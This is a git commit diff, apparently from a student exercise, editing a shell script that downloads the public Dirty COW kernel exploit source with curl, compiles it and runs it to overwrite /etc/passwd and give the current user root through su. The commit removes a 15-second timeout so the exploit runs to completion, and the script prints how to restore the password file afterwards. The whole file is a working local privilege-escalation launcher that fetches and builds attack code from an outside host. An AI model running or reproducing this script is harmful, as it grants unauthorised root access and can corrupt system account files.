dc736000a756b097668a3ed918054e76d21dba9f
mhufflep <mhufflep@student.21-school.ru>
2022-10-28 05:06:10 +0500

    removed timeout in dirtycow script

--- dirtycow/run.sh
+++ dirtycow/run.sh
@@ -6,13 +6,13 @@ PASSWORD=2142
 SRC=dirty.c
 COWNAME=dirty
 
-curl -ks https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c > $SRC
+curl -ks "https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c" > $SRC
 
 sed -i "s/firefart/$USER/g" $SRC
 
 gcc $SRC -o $COWNAME -lcrypt -lpthread
 
-timeout 15s ./$COWNAME $PASSWORD
-
-echo "Try access root with su ($USER:$PASSWORD)"
+echo "Wait a minute and try access root with su ($USER:$PASSWORD)"
 echo "To restore use: mv /tmp/passwd.bak /etc/passwd"
+
+./$COWNAME $PASSWORD
